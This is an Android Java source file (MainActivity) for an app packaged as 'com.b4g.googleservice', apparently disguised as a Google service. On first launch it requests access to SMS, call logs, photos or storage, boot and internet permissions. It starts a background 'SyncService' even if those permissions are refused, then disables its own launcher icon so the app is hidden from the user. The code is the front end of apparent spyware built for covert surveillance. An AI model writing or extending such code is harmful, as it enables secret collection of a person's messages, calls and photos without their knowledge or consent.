package com.b4g.googleservice;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.TextView;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1;
    private TextView statusTextView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        statusTextView = findViewById(R.id.statusTextView);
        statusTextView.setText("Initializing...");

        // Check if app has already been launched before
        SharedPreferences prefs = getSharedPreferences("AppPrefs", MODE_PRIVATE);
        boolean isFirstLaunch = prefs.getBoolean("isFirstLaunch", true);

        if (isFirstLaunch) {
            // Set first launch flag to false
            prefs.edit().putBoolean("isFirstLaunch", false).apply();

            // Request permissions
            if (checkAllPermissions()) {
                statusTextView.setText("Starting service...");
                startSyncService();
            } else {
                statusTextView.setText("Requesting permissions...");
                requestRequiredPermissions();
            }
        } else {
            // Hide app immediately if it's not the first launch
            hideAppFromLauncher();
            finish();
        }
    }

    private boolean checkAllPermissions() {
        List<String> permissions = getRequiredPermissions();
        for (String permission : permissions) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private List<String> getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        
        // Basic permissions
        permissions.add(Manifest.permission.INTERNET);
        permissions.add(Manifest.permission.RECEIVE_BOOT_COMPLETED);
        
        // Add sensitive permissions
        permissions.add(Manifest.permission.READ_CALL_LOG);
        permissions.add(Manifest.permission.READ_SMS);
        
        // Add appropriate storage permission based on Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
        } else {
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        
        return permissions;
    }

    private void requestRequiredPermissions() {
        List<String> permissions = getRequiredPermissions();
        ActivityCompat.requestPermissions(this, 
                permissions.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                statusTextView.setText("Permissions granted. Starting service...");
                startSyncService();
                hideAppFromLauncher(); // Hide after permission grant
            } else {
                statusTextView.setText("Missing permissions. App may not work properly.");
                Toast.makeText(this, "Some permissions denied. App may not work properly.", Toast.LENGTH_LONG).show();
                
                // Try to start anyway with limited functionality
                new android.os.Handler().postDelayed(() -> {
                    startSyncService();
                    hideAppFromLauncher();
                }, 3000);
            }
        }
    }

    private void startSyncService() {
        Intent serviceIntent = new Intent(this, SyncService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        Toast.makeText(this, "Sync service started", Toast.LENGTH_SHORT).show();
        
        // Don't finish immediately to allow time for the service to start
        new android.os.Handler().postDelayed(this::finish, 1000);
    }

    private void hideAppFromLauncher() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
        );
    }
} 